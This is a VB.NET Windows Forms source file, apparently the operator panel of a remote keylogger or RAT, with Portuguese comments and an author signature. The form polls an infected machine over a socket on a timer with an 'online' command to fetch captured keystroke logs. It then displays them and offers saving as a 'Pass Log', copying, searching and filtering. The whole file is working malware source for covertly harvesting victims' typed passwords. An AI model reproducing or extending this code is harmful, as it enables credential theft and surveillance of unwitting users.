Imports System.Text
Imports System
Imports System.IO
Imports System.Windows.Forms
Imports System.Windows.Forms.Form
Imports System.Windows.Forms.MessageBox 'para manter todas as messagebox em superior ou forme na hora de ser exebidas
Imports System.Windows.Forms.TextBox

'Coded pjoao1578
'v2
Public Class keylogger_online
#Region "key on"
    Public sock As Integer
    Dim yy As String = "||" 'yy = "||" = senha
#End Region

    Private Sub keylogger_online_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Form1.s.Send(sock, "online" & yy & Form1.s.IP(sock)) 'chamar logs
        Me.Timer1.Start()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Form1.s.Send(sock, "online" & yy & Form1.s.IP(sock)) 'chamar logs
    End Sub

    Private Sub UpdeterLogsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UpdeterLogsToolStripMenuItem.Click
        Me.Timer1.Stop()
        Me.TextBox1.Clear()
        Form1.s.Send(sock, "online" & yy & Form1.s.IP(sock)) 'chamar logs
        Me.Timer1.Start()
    End Sub

    Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem.Click
        Me.Timer1.Stop()
    End Sub

    Private Sub CleanTXTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CleanTXTToolStripMenuItem.Click
        Me.TextBox1.Clear()
    End Sub

    Private Sub SaveEmTXTToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SaveEmTXTToolStripMenuItem.Click
        'salvar em txt a pass do keylogger offine
        Dim sd As New SaveFileDialog()
        sd.Filter = "Pass Log TXT (*.txt)|*.txt" '.txt
        sd.FileName = "Log.txt" 'name
        If sd.ShowDialog() = Windows.Forms.DialogResult.OK Then
            Dim b As New StringBuilder()
            b.Append(Me.TextBox1.Text & vbNewLine)
            IO.File.WriteAllText(sd.FileName, b.ToString())
            MessageBox.Show("Salvo Em TXT", "Salvo", MessageBoxButtons.OK, MessageBoxIcon.Exclamation) 'Mensagem
        End If
    End Sub

    Private Sub CopyAllToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopyAllToolStripMenuItem.Click
        Me.TextBox1.SelectAll() 'select all txt
        Try
            My.Computer.Clipboard.SetText(Me.TextBox1.Text) 'copy txt all
        Catch ex As Exception 'erro nao report
        End Try
        MessageBox.Show("TXT Copiado", "Copiado !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
    End Sub

    Private Sub CopySelectedToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CopySelectedToolStripMenuItem.Click
        Try
            My.Computer.Clipboard.SetText(Me.TextBox1.SelectedText) 'copy txt Selected
        Catch ex As Exception 'erro nao report
        End Try
        MessageBox.Show("TXT Copiado", "Copiado !", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        'deleti palavras escolhida do keylogger offine
        Dim Linhas = Me.TextBox1.Text.Split(System.Environment.NewLine)
        Me.TextBox1.Text = String.Empty
        For Each Linha As String In Linhas
            Dim Inicio As Integer = Linha.IndexOf(Me.TextBox2.Text)
            If (Inicio <> -1) Then
                Linha = Linha.Replace(Linha.Substring(Inicio), "")
                Me.TextBox1.Text += Linha + System.Environment.NewLine
            Else
                Me.TextBox1.Text += Linha + System.Environment.NewLine
            End If
        Next
        MessageBox.Show("Foi Deletado", "Deletado", MessageBoxButtons.OK, MessageBoxIcon.Error) 'Mensagem
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        'procurar uma palavra ou letra no keylogger offine
        Dim lngInicio As Long
        Try
            lngInicio = InStr(Me.TextBox1.Text, Me.TextBox2.Text)

            If lngInicio > -1 Then
                Me.TextBox1.Select(lngInicio - 1, Me.TextBox2.TextLength)
                Me.TextBox1.Focus()
                Me.TextBox1.ScrollToCaret()
            End If
        Catch ex As Exception
            MessageBox.Show("Erro !! Não Encontrada", "Erro !", MessageBoxButtons.OK, MessageBoxIcon.Error) 'Mensagem
        End Try
    End Sub
End Class